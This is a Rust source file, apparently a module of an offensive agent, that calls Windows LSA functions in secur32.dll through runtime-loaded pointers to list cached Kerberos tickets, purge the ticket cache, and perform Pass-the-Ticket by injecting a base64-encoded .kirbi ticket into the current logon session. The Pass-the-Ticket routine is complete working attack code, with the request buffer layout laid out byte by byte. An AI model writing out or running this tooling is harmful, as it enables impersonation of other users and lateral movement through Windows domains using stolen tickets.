/// Kerberos ticket operations via secur32.dll LSA APIs.
/// Mirrors kerberos.c and kerberos.nim — same struct layouts, same fallback logic.
use base64::{engine::general_purpose::STANDARD, Engine as _};
use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};

// ── LSA function pointer types ────────────────────────────────────────────────

type FnLsaConnect = unsafe extern "system" fn(*mut isize) -> i32;
type FnLsaLookup  = unsafe extern "system" fn(isize, *const u8, *mut u32) -> i32;
type FnLsaCall    = unsafe extern "system" fn(
    isize, u32, *const u8, u32, *mut *mut u8, *mut u32, *mut i32,
) -> i32;
type FnLsaFree    = unsafe extern "system" fn(*mut u8) -> i32;

struct LsaFns {
    connect: FnLsaConnect,
    lookup:  FnLsaLookup,
    call:    FnLsaCall,
    free:    FnLsaFree,
}

// ── Runtime loading of secur32.dll ───────────────────────────────────────────

fn load_lsa_fns() -> Option<LsaFns> {
    unsafe {
        let lib = LoadLibraryA(b"secur32.dll\0".as_ptr());
        if lib == 0 { return None; }
        let f1 = GetProcAddress(lib, b"LsaConnectUntrusted\0".as_ptr())?;
        let f2 = GetProcAddress(lib, b"LsaLookupAuthenticationPackage\0".as_ptr())?;
        let f3 = GetProcAddress(lib, b"LsaCallAuthenticationPackage\0".as_ptr())?;
        let f4 = GetProcAddress(lib, b"LsaFreeReturnBuffer\0".as_ptr())?;
        Some(LsaFns {
            connect: std::mem::transmute(f1),
            lookup:  std::mem::transmute(f2),
            call:    std::mem::transmute(f3),
            free:    std::mem::transmute(f4),
        })
    }
}

// ── Open LSA handle and resolve Kerberos package ID ──────────────────────────

unsafe fn kerb_open(fns: &LsaFns) -> Result<(isize, u32), String> {
    let mut handle: isize = 0;
    let st = (fns.connect)(&mut handle);
    if st < 0 {
        return Err(format!("LsaConnectUntrusted NTSTATUS=0x{:08X}", st as u32));
    }

    // x64 LSA_STRING (ANSI) layout — 16 bytes total:
    //   [0..2)  Length        (u16)
    //   [2..4)  MaximumLength (u16)
    //   [4..8)  padding       (4 bytes, align pointer to 8)
    //   [8..16) Buffer        (*const u8, 8 bytes)
    // Build as a raw byte array to avoid repr(C) subtleties.
    let name: &[u8] = b"Kerberos";
    let mut lsa_str = [0u8; 16];
    lsa_str[0..2].copy_from_slice(&(name.len() as u16).to_le_bytes());
    lsa_str[2..4].copy_from_slice(&((name.len() as u16) + 1).to_le_bytes());
    lsa_str[8..16].copy_from_slice(&(name.as_ptr() as u64).to_le_bytes());

    let mut pkg_id: u32 = 0;
    let st = (fns.lookup)(handle, lsa_str.as_ptr(), &mut pkg_id);
    if st < 0 {
        return Err(format!(
            "LsaLookupAuthenticationPackage NTSTATUS=0x{:08X}", st as u32
        ));
    }
    Ok((handle, pkg_id))
}

// ── Public API ────────────────────────────────────────────────────────────────

/// List cached Kerberos tickets.
/// Runs klist.exe first (works whenever Kerberos creds are in cache), then
/// falls back to a raw LSA KerbQueryTicketCacheExMessage (type 14) ticket count.
pub fn kerb_list_tickets() -> String {
    use std::process::Command;
    if let Ok(o) = Command::new("cmd.exe").args(["/s", "/c", "klist 2>&1"]).output() {
        let out = String::from_utf8_lossy(&o.stdout).into_owned();
        if !out.trim().is_empty() {
            return out;
        }
    }

    // Fallback: LSA query for ticket count.
    let fns = match load_lsa_fns() {
        Some(f) => f,
        None    => return "[error: secur32.dll unavailable]".into(),
    };
    unsafe {
        let (handle, pkg_id) = match kerb_open(&fns) {
            Ok(v)  => v,
            Err(e) => return format!("[error: {}]", e),
        };
        // KerbQueryTicketCacheExMessage = 14, request = MessageType(4) + LogonId(8)
        let mut req = [0u8; 12];
        req[0..4].copy_from_slice(&14u32.to_le_bytes());

        let mut resp_ptr: *mut u8 = std::ptr::null_mut();
        let mut resp_len: u32 = 0;
        let mut prot_st: i32  = 0;
        (fns.call)(
            handle, pkg_id, req.as_ptr(), req.len() as u32,
            &mut resp_ptr, &mut resp_len, &mut prot_st,
        );

        if resp_ptr.is_null() {
            return "[error: klist unavailable; LSA query returned no data]".into();
        }
        // KERB_QUERY_TKT_CACHE_EX_RESPONSE: MessageType(4) then CountOfTickets(4)
        let count = *(resp_ptr.add(4) as *const u32);
        (fns.free)(resp_ptr);
        format!("Kerberos ticket cache: {} ticket(s) (klist unavailable)", count)
    }
}

/// Pass-the-Ticket: import a base64-encoded .kirbi blob into the current
/// logon session via LsaCallAuthenticationPackage / KerbSubmitTicketMessage.
///
/// KERB_SUBMIT_TKT_REQUEST flat buffer (36-byte header + kirbi bytes):
///   +0   MessageType  = 21 (KerbSubmitTicketMessage)
///   +4   LogonId.LowPart  = 0  (current session)
///   +8   LogonId.HighPart = 0
///   +12  Flags            = 0
///   +16  Key32.KeyType    = 0
///   +20  Key32.Length     = 0
///   +24  Key32.Offset     = 0
///   +28  KerbCredSize     = len(ticket)
///   +32  KerbCredOffset   = 36  (== header size)
///   +36  <raw .kirbi bytes>
pub fn kerb_pass_ticket(b64: &str) -> String {
    let ticket_bytes = match STANDARD.decode(b64.trim()) {
        Ok(b) if !b.is_empty() => b,
        Ok(_)  => return "[error: empty ticket]".into(),
        Err(e) => return format!("[error: base64 decode: {}]", e),
    };

    let fns = match load_lsa_fns() {
        Some(f) => f,
        None    => return "[error: secur32.dll unavailable]".into(),
    };
    unsafe {
        let (handle, pkg_id) = match kerb_open(&fns) {
            Ok(v)  => v,
            Err(e) => return format!("[error: {}]", e),
        };

        const HDR: usize = 36;
        let mut buf = vec![0u8; HDR + ticket_bytes.len()];
        buf[0..4].copy_from_slice(&21u32.to_le_bytes());                          // MessageType
        buf[28..32].copy_from_slice(&(ticket_bytes.len() as u32).to_le_bytes()); // KerbCredSize
        buf[32..36].copy_from_slice(&(HDR as u32).to_le_bytes());                // KerbCredOffset
        buf[HDR..].copy_from_slice(&ticket_bytes);

        let mut resp_ptr: *mut u8 = std::ptr::null_mut();
        let mut resp_len: u32 = 0;
        let mut prot_st: i32  = 0;
        let st = (fns.call)(
            handle, pkg_id, buf.as_ptr(), buf.len() as u32,
            &mut resp_ptr, &mut resp_len, &mut prot_st,
        );
        if !resp_ptr.is_null() { (fns.free)(resp_ptr); }

        if st < 0 || prot_st < 0 {
            format!(
                "[error: PTT failed NTSTATUS=0x{:08X} protocolStatus=0x{:08X}]",
                st as u32, prot_st as u32
            )
        } else {
            "[+] ticket submitted successfully".into()
        }
    }
}

/// Purge all Kerberos tickets for the current logon session.
///
/// KERB_PURGE_TKT_CACHE_REQUEST flat buffer (48 bytes):
///   +0   MessageType = 6 (KerbPurgeTicketCacheMessage)
///   +4   LogonId.LowPart  = 0
///   +8   LogonId.HighPart = 0
///   +12  padding (align UNICODE_STRING to 8 bytes)
///   +16  ServerName  UNICODE_STRING { Length=0, MaxLen=0, pad(4), Buffer=null }
///   +32  RealmName   UNICODE_STRING { Length=0, MaxLen=0, pad(4), Buffer=null }
///   total = 48 bytes; all zeros except MessageType
pub fn kerb_purge() -> String {
    let fns = match load_lsa_fns() {
        Some(f) => f,
        None    => return "[error: secur32.dll unavailable]".into(),
    };
    unsafe {
        let (handle, pkg_id) = match kerb_open(&fns) {
            Ok(v)  => v,
            Err(e) => return format!("[error: {}]", e),
        };

        let mut req = [0u8; 48];
        req[0..4].copy_from_slice(&6u32.to_le_bytes()); // KerbPurgeTicketCacheMessage

        let mut resp_ptr: *mut u8 = std::ptr::null_mut();
        let mut resp_len: u32 = 0;
        let mut prot_st: i32  = 0;
        (fns.call)(
            handle, pkg_id, req.as_ptr(), req.len() as u32,
            &mut resp_ptr, &mut resp_len, &mut prot_st,
        );
        if !resp_ptr.is_null() { (fns.free)(resp_ptr); }

        if prot_st < 0 {
            format!("[error: purge NTSTATUS=0x{:08X}]", prot_st as u32)
        } else {
            "[+] Kerberos ticket cache purged".into()
        }
    }
}
